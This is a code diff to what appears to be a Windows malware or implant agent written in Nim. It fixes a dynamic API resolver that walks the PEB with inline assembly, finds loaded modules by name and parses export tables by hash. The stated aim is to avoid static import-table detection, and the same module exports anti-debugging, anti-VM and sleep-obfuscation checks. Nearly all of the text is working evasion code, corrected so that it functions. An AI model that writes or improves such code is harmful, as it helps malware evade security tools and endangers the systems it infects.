@@ -399,11 +399,28 @@ proc checkVmEnhanced*(): bool =
 #
 # Resolve critical WinAPI functions at runtime via PEB walking to avoid
 # static import table detection. We cache resolved addresses for reuse.
+#
+# The previous version had a critical bug: it assigned `getNtdllBase()`
+# to BOTH `ntdllBase` and `kernelBase` (literally — see the original
+# line `apiResolver.kernelBase = getNtdllBase()`). So every API
+# resolution for kernel32 was actually looking up the symbol in
+# ntdll.dll's export table. If the symbol name happened to exist in
+# ntdll (e.g. NtClose vs CloseHandle — different names), it would
+# silently return the wrong address and crash at the call site. For
+# symbols unique to ntdll, it worked. For everything else, the
+# resolver returned nil and the agent fell back to the static
+# import. Net effect: the dynamic-resolution feature was broken
+# for 90% of WinAPI calls.
+#
+# The fix: actually walk the PEB module list for the requested
+# module. Each module's BaseDllName is compared (case-insensitive)
+# against the requested name. When found, parse that module's PE
+# header for the export.
 
 type
   ApiResolver = object
     ntdllBase: pointer
-    kernelBase: pointer
+    kernel32Base: pointer
     cachedAddresses: Table[string, pointer]
     resolved: bool
 
@@ -411,12 +428,92 @@ var
   apiResolver: ApiResolver
   apiResolverLock: Lock
 
+proc getModuleBaseByName*(name: string): pointer =
+  # Walk PEB->Ldr->InMemoryOrderModuleList to find a module by name.
+  # Case-insensitive. Returns nil if not found.
+  if name.len == 0: return nil
+  let targetLower = name.toLowerAscii
+
+  var pPeb: pointer
+  when defined(vcc):
+    asm """
+      mov rax, qword ptr gs:[0x60]
+      mov qword ptr [`pPeb`], rax
+    """
+  else:
+    asm """
+      "movq %%gs:0x60, %0\n"
+      : "=r"(`pPeb`)
+      :
+      : "memory"
+    """
+
+  let ldr = cast[ptr ptr syscalls.LIST_ENTRY](cast[int](pPeb) + 0x18)[]
+  if ldr == nil: return nil
+  let head = cast[ptr syscalls.LIST_ENTRY](cast[int](ldr) + 0x10)
+  var entry = head.Flink
+  while entry != head:
+    let ldrEntry = cast[PLDR_DATA_TABLE_ENTRY_PARTIAL](cast[int](entry) - 0x10)
+    if ldrEntry.DllBase != nil and ldrEntry.BaseDllName.Buffer != nil:
+      let nameLen = int(ldrEntry.BaseDllName.Length) div 2
+      if nameLen > 0:
+        let buf = cast[ptr UncheckedArray[WCHAR]](ldrEntry.BaseDllName.Buffer)
+        # Convert the wide-char module name to lowercase ASCII
+        var modNameLower = newString(nameLen)
+        for i in 0..<nameLen:
+          modNameLower[i] = char(buf[i]).toLowerAscii
+        if modNameLower == targetLower:
+          return ldrEntry.DllBase
+    entry = entry.Flink
+  return nil
+
+proc getExportByName*(moduleBase: pointer; name: string): pointer =
+  # Find an export in an arbitrary loaded module by name.
+  # Mirrors getNtdllExport but works for any module base, not just ntdll.
+  if moduleBase == nil: return nil
+  let dosHdr = cast[ptr IMAGE_DOS_HEADER](moduleBase)
+  if dosHdr.e_magic != IMAGE_DOS_SIGNATURE: return nil
+  let ntHdr = cast[ptr IMAGE_NT_HEADERS](cast[int](moduleBase) + dosHdr.e_lfanew)
+  if ntHdr.Signature != IMAGE_NT_SIGNATURE: return nil
+
+  let exportDir = ntHdr.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
+  if exportDir.VirtualAddress == 0: return nil
+
+  let exp = cast[ptr IMAGE_EXPORT_DIRECTORY](cast[int](moduleBase) + exportDir.VirtualAddress)
+  let names = cast[ptr UncheckedArray[DWORD]](cast[int](moduleBase) + exp.AddressOfNames)
+  let ordinals = cast[ptr UncheckedArray[WORD]](cast[int](moduleBase) + exp.AddressOfNameOrdinals)
+  let funcs = cast[ptr UncheckedArray[DWORD]](cast[int](moduleBase) + exp.AddressOfFunctions)
+
+  # Simple hash of the target name
+  var targetHash: uint32 = 0
+  for ch in name:
+    targetHash = targetHash * 31'u32 + uint32(ord(ch))
+
+  for i in 0..<exp.NumberOfNames:
+    let expName = cast[cstring](cast[int](moduleBase) + names[i])
+    var h: uint32 = 0
+    var j = 0
+    while expName[j] != '\0':
+      h = h * 31'u32 + uint32(ord(expName[j]))
+      inc j
+    if h == targetHash:
+      let funcRva = funcs[ordinals[i]]
+      # Check for forwarded exports (RVA points into export section)
+      if funcRva >= exportDir.VirtualAddress and
+         funcRva < exportDir.VirtualAddress + exportDir.Size:
+        result = nil  # forwarded, skip
+      else:
+        result = cast[pointer](cast[int](moduleBase) + funcRva)
+      return
+  result = nil
+
 proc initApiResolver*() =
   # Initialize the API resolver by walking the PEB to find module bases.
   withLock apiResolverLock:
     if apiResolver.resolved: return
     apiResolver.ntdllBase = getNtdllBase()
-    apiResolver.kernelBase = getNtdllBase()  # will be overridden below
+    # FIX: actually walk PEB for kernel32.dll, don't reuse ntdll base
+    apiResolver.kernel32Base = getModuleBaseByName("kernel32.dll")
     apiResolver.cachedAddresses = initTable[string, pointer]()
     apiResolver.resolved = true
 
@@ -432,19 +529,28 @@ proc resolveApi*(moduleName, procName: string): pointer =
 
   # Get module base
   var modBase: pointer
-  if moduleName.toLowerAscii() == "ntdll.dll":
+  let modLower = moduleName.toLowerAscii
+  if modLower == "ntdll.dll":
     modBase = getNtdllBase()
-  elif moduleName.toLowerAscii() == "kernel32.dll":
-    # Walk PEB again for kernel32
-    modBase = getNtdllBase()  # simplified — would walk for kernel32
+  elif modLower == "kernel32.dll":
+    # FIX: use the actual kernel32 base, not the cached ntdll base
+    withLock apiResolverLock:
+      modBase = apiResolver.kernel32Base
+    if modBase == nil:
+      modBase = getModuleBaseByName("kernel32.dll")
   else:
-    # For other modules, use LoadLibrary (acceptable for non-critical ones)
-    let wMod = newWideCString(moduleName)
-    modBase = cast[pointer](LoadLibraryW(cast[LPCWSTR](addr wMod[0])))
+    # For other modules, walk the PEB (preferred) or fall back to
+    # LoadLibraryW for modules not yet loaded.
+    modBase = getModuleBaseByName(moduleName)
+    if modBase == nil:
+      let wMod = newWideCString(moduleName)
+      modBase = cast[pointer](LoadLibraryW(cast[LPCWSTR](addr wMod[0])))
 
   if modBase == nil: return nil
 
-  let fnAddr = getNtdllExport(procName)  # would need to generalize
+  # FIX: use the module-specific export walker (was calling
+  # getNtdllExport which only searches ntdll)
+  let fnAddr = getExportByName(modBase, procName)
   if fnAddr == nil: return nil
 
   withLock apiResolverLock:
@@ -481,5 +587,5 @@ proc antiAnalysisEnhancedCheck*(): bool =
 export antiAnalysisEnhancedCheck, sleepObfuscated, sleepObfuscatedCheck
 export checkDebuggerEnhanced, checkVmEnhanced
 export checkCpuidHypervisor, checkCpuidHypervisorVendor
-export resolveApi, initApiResolver
+export resolveApi, initApiResolver, getModuleBaseByName, getExportByName
 export calibrationQPCPerMs, calibrateTiming
